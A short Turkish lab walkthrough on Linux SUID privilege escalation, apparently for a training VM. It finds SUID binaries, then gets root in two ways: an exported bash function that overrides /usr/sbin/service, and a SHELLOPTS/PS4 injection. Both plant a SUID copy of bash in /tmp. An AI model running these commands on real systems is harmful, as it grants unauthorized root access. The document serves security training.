# Linux VM SUID Tespiti ve İstismarı

## 1. SUID Binarilerinin Tespiti
Linux sisteminde SUID bitine sahip olan dosyaları tespit etmek için aşağıdaki komutu çalıştırın:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Bu komutun çıktısında yer alan SUID binarilerini not edin.

## 2. Binari İçerisinde Kullanılan Fonksiyonları İnceleme
Binarinin içerisinde hangi fonksiyonların kullanıldığını görmek için aşağıdaki komutu çalıştırın:

```bash
strings /usr/local/bin/suid-env
```

Bu komut, binari içerisinde kullanılan string ifadeleri ve olası fonksiyonları gösterecektir.

---

## İstismar Yöntemleri

### Yöntem #1: SUID ile Yetki Yükseltme
Aşağıdaki komutları sırasıyla çalıştırarak, yetki yükseltme işlemi gerçekleştirebilirsiniz:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

```bash
export -f /usr/sbin/service
```

```bash
/usr/local/bin/suid-env2
```

Bu adımlar, `/tmp` dizininde SUID bitine sahip bir bash shell oluşturacaktır. Root haklarıyla erişim sağlamak için aşağıdaki komutu kullanabilirsiniz:

```bash
/tmp/bash -p
```

---

### Yöntem #2: `env` Kullanarak Yetki Yükseltme
Alternatif olarak, aşağıdaki komutu kullanarak benzer bir yetki yükseltme işlemi gerçekleştirebilirsiniz:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

Bu yöntem, `env` komutunu kullanarak bir bash shell oluşturur ve root yetkileriyle çalıştırır.

---



